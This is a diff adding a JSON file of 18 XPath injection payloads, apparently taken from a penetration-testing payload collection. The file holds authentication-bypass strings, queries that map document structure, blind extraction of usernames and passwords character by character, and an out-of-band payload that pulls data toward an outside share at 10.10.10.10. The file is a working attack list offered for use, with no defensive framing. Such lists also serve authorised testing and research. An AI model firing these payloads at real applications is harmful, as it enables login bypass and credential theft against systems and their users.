@@ -1,0 +1,164 @@
+[
+  {
+    "id": "xpath-injection-1",
+    "title": "Methodology",
+    "payload": "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-2",
+    "title": "Methodology",
+    "payload": "' or '1'='1",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-3",
+    "title": "Methodology",
+    "payload": "' or ''='",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-4",
+    "title": "Methodology",
+    "payload": "x' or 1=1 or 'x'='y",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-5",
+    "title": "Methodology",
+    "payload": "*/*",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-6",
+    "title": "Methodology",
+    "payload": "@*",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-7",
+    "title": "Methodology",
+    "payload": "count(/child::node())",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-8",
+    "title": "Methodology",
+    "payload": "x' or name()='username' or 'x'='y",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-9",
+    "title": "Methodology",
+    "payload": "' and count(/*)=1 and '1'='1",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-10",
+    "title": "Methodology",
+    "payload": "' and count(/@*)=1 and '1'='1",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-11",
+    "title": "Methodology",
+    "payload": "' and count(/comment())=1 and '1'='1",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-12",
+    "title": "Methodology",
+    "payload": "')] | //user/*[contains(*,'",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-13",
+    "title": "Methodology",
+    "payload": "') and contains(../password,'c",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-14",
+    "title": "Methodology",
+    "payload": "') and starts-with(../password,'c",
+    "context": "Methodology",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-15",
+    "title": "Blind Exploitation",
+    "payload": "and string-length(account)=SIZE_INT",
+    "context": "Blind Exploitation",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-16",
+    "title": "Blind Exploitation",
+    "payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE",
+    "context": "Blind Exploitation",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-17",
+    "title": "Blind Exploitation",
+    "payload": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "context": "Blind Exploitation",
+    "tags": [
+      "xpath-injection"
+    ]
+  },
+  {
+    "id": "xpath-injection-18",
+    "title": "Out Of Band Exploitation",
+    "payload": "http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')",
+    "context": "Out Of Band Exploitation",
+    "tags": [
+      "xpath-injection"
+    ]
+  }
+]
